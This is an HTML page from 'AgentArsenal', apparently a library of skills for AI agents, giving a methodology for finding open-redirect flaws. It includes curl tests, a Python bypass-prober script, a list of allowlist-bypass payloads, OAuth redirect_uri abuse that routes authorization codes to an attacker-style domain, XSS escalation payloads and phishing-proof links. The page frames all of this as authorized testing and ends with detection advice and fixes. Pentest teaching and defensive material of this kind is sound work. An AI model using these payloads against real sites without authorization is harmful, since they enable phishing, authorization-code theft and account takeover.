@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: open-redirect</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>open-redirect</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing for unvalidated redirects and forwards on an</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>An open redirect happens when the application sends the user to a URL taken from request input without validating it. Alone it looks minor, but it is the engine behind convincing phishing (the link shows the trusted domain), OAuth token theft, and chained XSS. This skill covers the authorized methodology: finding redirect sinks, testing allowlist bypasses, handling JavaScript and meta refresh redirects, and abusing OAuth redirect URIs. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Crawl the application and collect every parameter that influences a</li>
+<p>redirect: <code>next</code>, <code>return</code>, <code>returnUrl</code>, <code>redirect</code>, <code>redirect_uri</code>, <code>continue</code>, <code>dest</code>, <code>url</code>, <code>r</code>, <code>to</code>.</p>
+<li>Test each with a canary external domain and record the response: 30x</li>
+<p>Location header, JavaScript redirect, or meta refresh.</p>
+<li>If a filter blocks the canary, work through the bypass list in order:</li>
+<p>scheme tricks, slash tricks, encoding, @ tricks, subdomain tricks.</p>
+<li>Test parameter pollution and path confusion variants for filters that</li>
+<p>inspect only one copy of the parameter.</p>
+<li>Check OAuth and SSO flows: <code>redirect_uri</code> validation is the highest</li>
+<p>value target.</p>
+<li>Prove phishing impact with a full crafted link and a screenshot of the</li>
+<p>trusted domain sending the browser to the test domain.</p>
+<li>Record every payload, the exact response, and the filter behavior for</li>
+<p>the report.</p>
+</ol>
+<h2>1. Finding redirect parameters</h2>
+<p>Redirect parameters appear in login, logout, registration, language switchers, and error pages. Harvest them from crawling and from proxy history.</p>
+<pre><code class="language-bash"># Grep proxy history or Burp target for common redirect parameter names
+grep -oiE &#x27;[?&amp;](next|return|returnurl|redirect|redirect_uri|continue|dest|destination|url|r|to|forward)=[^&amp; ]+&#x27; \
+  /tmp/burp-target-export.txt | sort -u | head -40</code></pre>
+<pre><code class="language-bash"># Quick manual sweep of the obvious endpoints with a canary value
+for endpoint in &quot;/login?next=&quot; &quot;/logout?return=&quot; &quot;/sso?redirect_uri=&quot;; do
+  echo &quot;== $endpoint ==&quot;
+  curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+    &quot;https://target.example${endpoint}https://canary.example/x&quot;
+done</code></pre>
+<p>Also watch for redirects that happen in JavaScript (<code>window.location =</code>, <code>location.href =</code>, <code>location.replace(</code>) and in meta refresh tags, which curl&#x27;s <code>%{redirect_url}</code> will not show. Load the page and read the body:</p>
+<pre><code class="language-bash">curl -s &#x27;https://target.example/goto?url=https://canary.example/x&#x27; \
+  | grep -oiE &#x27;(window\.location[^;]*|meta[^&gt;]*refresh[^&gt;]*)&#x27; | head -5</code></pre>
+<h2>2. Basic payload tests</h2>
+<p>Confirm the sink is really open before spending time on bypasses. Use a domain you control for the test (a local test server or a canary domain), never a real third party.</p>
+<pre><code class="language-bash"># Absolute URL: the classic test
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/redirect?url=https://canary.example/pwned&#x27;
+
+# Protocol-relative URL (inherits https from the page)
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/redirect?url=//canary.example/pwned&#x27;
+
+# Single slash path (should stay on-site: control case)
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/redirect?url=/dashboard&#x27;</code></pre>
+<p>A 301, 302, 303, or 307 to the canary confirms the open redirect. A 200 with the canary in a <code>Location</code> meta tag or JS assignment confirms the client-side variants. Record the exact status code and header.</p>
+<h2>3. Allowlist bypass techniques</h2>
+<p>Filters usually try to keep redirects on-site. Work through these bypasses in order, testing each against the live filter.</p>
+<pre><code class="language-bash">BASE=&#x27;https://target.example/redirect?url=&#x27;
+t() { curl -s -o /dev/null -w &quot;%{http_code} -&gt; %{redirect_url}\n&quot; &quot;$BASE$1&quot;; }
+
+t &#x27;https://canary.example&#x27;            # baseline, expect block
+t &#x27;//canary.example&#x27;                 # protocol-relative
+t &#x27;https:\\\\canary.example&#x27;         # backslashes (browsers normalize)
+t &#x27;https:/canary.example&#x27;            # single slash after scheme
+t &#x27;https://canary.example%2f..&#x27;      # encoded slash confusion
+t &#x27;https://target.example@canary.example&#x27;   # @ trick: userinfo part
+t &#x27;https://target.example%40canary.example&#x27; # encoded @
+t &#x27;https://canary.target.example&#x27;    # subdomain trick vs suffix check
+t &#x27;https://targetexample.com&#x27;        # lookalike domain vs prefix check
+t &#x27;https://target.example.&#x27;          # trailing dot
+t &#x27;/%5ccanary.example&#x27;               # encoded backslash path start</code></pre>
+<pre><code class="language-bash"># Whitespace and control characters that parsers strip
+t &#x27;%20https://canary.example&#x27;
+t &#x27;https://canary.example%09&#x27;
+# Fragment trick: filter sees the trusted domain, browser may still go elsewhere
+t &#x27;https://target.example#@canary.example&#x27;</code></pre>
+<p>A Python loop with a payload file keeps this systematic and logged:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Open-redirect bypass prober (authorized targets only).&quot;&quot;&quot;
+import urllib.request, urllib.parse
+
+BASE = &quot;https://target.example/redirect?url=&quot;
+PAYLOADS = [
+    &quot;https://canary.example&quot;,
+    &quot;//canary.example&quot;,
+    &quot;https:\\\\canary.example&quot;,
+    &quot;https://target.example@canary.example&quot;,
+    &quot;https://canary.target.example&quot;,
+    &quot;https://target.example%2e%2e/canary.example&quot;,
+]
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, hdrs, newurl):
+        return None
+opener = urllib.request.build_opener(NoRedirect)
+for p in PAYLOADS:
+    url = BASE + urllib.parse.quote(p, safe=&quot;&quot;)
+    try:
+        r = opener.open(url, timeout=10)
+        print(f&quot;{r.status} no-redirect body-has-canary={&#x27;canary&#x27; in r.read().decode(errors=&#x27;replace&#x27;)}&quot;)
+    except urllib.error.HTTPError as e:
+        print(f&quot;{e.code} -&gt; {e.headers.get(&#x27;Location&#x27;)}   payload={p}&quot;)</code></pre>
+<h2>4. Parameter pollution and logic flaws</h2>
+<p>When the filter inspects one copy of the parameter but the redirect uses another, duplicate the parameter.</p>
+<pre><code class="language-bash"># First copy passes the filter, second copy wins the redirect (or reverse)
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/redirect?url=/dashboard&amp;url=https://canary.example&#x27;
+
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/redirect?url=https://canary.example&amp;url=/dashboard&#x27;</code></pre>
+<p>Also test case variants of the parameter name (<code>URL</code>, <code>Url</code>, <code>REDIRECT</code>), array syntax (<code>url[]=https://canary.example</code>), and JSON bodies where the redirect target arrives as <code>{&quot;url&quot;: &quot;...&quot;}</code> instead of a query string.</p>
+<h2>5. JavaScript and meta refresh redirects</h2>
+<p>Client-side redirects need different confirmation: fetch the page and read where it sends the browser.</p>
+<pre><code class="language-bash"># Meta refresh variant
+curl -s &#x27;https://target.example/goto?to=https://canary.example&#x27; \
+  | grep -i &#x27;http-equiv=&quot;refresh&quot;&#x27;
+
+# JavaScript variant: capture the assignment target
+curl -s &#x27;https://target.example/goto?to=https://canary.example&#x27; \
+  | grep -oE &#x27;location(\.href|)=[&quot;&#x27;&quot;&#x27;&quot;&#x27;][^&quot;&#x27;&quot;&#x27;&quot;&#x27;]+&#x27; | head -5</code></pre>
+<p>Client-side sinks often have weaker validation than server-side 30x redirects, and some only encode the payload with <code>encodeURI</code>, which leaves the bypasses from section 3 working. When the value lands inside a JS string, also test for break-out to XSS: <code>&quot;;alert(1);//</code>.</p>
+<h2>6. OAuth and SSO redirect_uri abuse</h2>
+<p>This is the highest-impact open redirect class: a loose <code>redirect_uri</code> lets an attacker receive the victim&#x27;s authorization code or token.</p>
+<pre><code class="language-bash"># Try registering the flow with an attacker redirect_uri (use test client)
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/oauth/authorize?client_id=testclient&amp;response_type=code&amp;redirect_uri=https://canary.example/cb&#x27;
+
+# Suffix bypass against registered https://app.target.example/callback
+curl -s -o /dev/null -w &#x27;%{http_code} -&gt; %{redirect_url}\n&#x27; \
+  &#x27;https://target.example/oauth/authorize?client_id=testclient&amp;response_type=code&amp;redirect_uri=https://app.target.example.evil.example/callback&#x27;</code></pre>
+<p>Test whether the server validates the full URI, only the domain, or only a prefix. Check for <code>redirect_uri</code> values with fragments, query strings appended to a registered URI, and subdirectory traversal under a registered path. If authorization codes are issued to the attacker domain in the lab, that is critical severity: codes become tokens, and tokens become the victim&#x27;s account.</p>
+<h2>7. Proving phishing impact</h2>
+<p>Build the final proof link and screenshot the chain: trusted domain in the address bar, then arrival at the test domain.</p>
+<pre><code class="language-bash"># Final proof URL (replace with the working bypass payload)
+echo &#x27;https://target.example/login?next=https://canary.example/login-lookalike&#x27;</code></pre>
+<p>Document the full click path: where the link would be delivered (email, support chat), what the victim sees (the real domain), and where they land (attacker page). If the engagement includes a phishing simulation clause, coordinate with the client before sending anything to real users; otherwise keep the proof to screenshots and request logs.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The redirect only fires after login: authenticate as the test user</li>
+<p>first, then replay the payload with the session cookie.</p>
+<li>The filter allowlists by regex on the full URL: test regex injection</li>
+<p>via the payload (for example a <code>?</code> that makes the rest optional).</p>
+<li>Mobile deep links (<code>myapp://</code>): the sink may redirect to app schemes;</li>
+<p>test whether <code>javascript:</code> or <code>data:</code> schemes are accepted, which escalates to XSS on older browsers.</p>
+<li>The application signs redirect URLs (HMAC): look for the signing</li>
+<p>endpoint or a leaked secret rather than fighting the signature.</p>
+<li>POST-based redirects: the parameter arrives in the body, so the curl</li>
+<p>tests need <code>-d</code>; Burp Repeater makes this faster.</p>
+<li>The redirect goes through an interstitial warning page (&quot;you are</li>
+<p>leaving our site&quot;): check whether the warning can be skipped with a parameter, and note that the warning still counts as a finding but at lower severity.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Open redirect plus reflected input on the landing page: chain into</li>
+<p>XSS by redirecting to <code>javascript:alert(1)</code> where the browser still honors it, or to a <code>data:text/html</code> page.</p>
+<li>Open redirect in OAuth: escalate to full account takeover via code</li>
+<p>theft, as described in section 6.</p>
+<li>Redirect to <code>//attacker</code> plus the application reflecting the</li>
+<p><code>Referer</code>: the attacker&#x27;s page learns the victim&#x27;s internal URLs.</p>
+<li>The filter blocks everything except relative paths: try</li>
+<p><code>/\canary.example</code> and <code>//canary.example%2f..</code> path confusion, which some frameworks normalize into absolute URLs server-side.</p>
+<li>No direct redirect but the parameter lands in a link <code>href</code> on the</li>
+<p>page: test <code>javascript:</code> and <code>data:</code> schemes in the href for stored or reflected XSS.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see open redirects as 30x responses whose Location header points to external domains, especially right after login or logout, and as user reports of phishing links that start with the company&#x27;s own domain. Logs showing <code>redirect_uri</code> values outside the registered set are the OAuth smoking gun. The durable fixes are an explicit allowlist of redirect targets (path-only redirects where possible), validating OAuth <code>redirect_uri</code> with exact string match against pre-registered values, and never building redirect targets by concatenating user input. Warning interstitials help users but do not fix the underlying trust issue.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry</li>
+<p>point class.</p>
+<li>CWE-601 (URL Redirection to Untrusted Site, Open Redirect).</li>
+<li>CWE-20 (Improper Input Validation): the root cause class.</li>
+<li>OWASP Testing Guide OTG-CLIENT-004 (Testing for Client-Side URL</li>
+<p>Redirect).</p>
+<li>OAuth 2.0 Security Best Current Practice (RFC draft): exact-match</li>
+<p>redirect_uri validation.</p>
+<li>PortSwigger Web Security Academy: open redirection labs and bypass</li>
+<p>cheat sheet.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
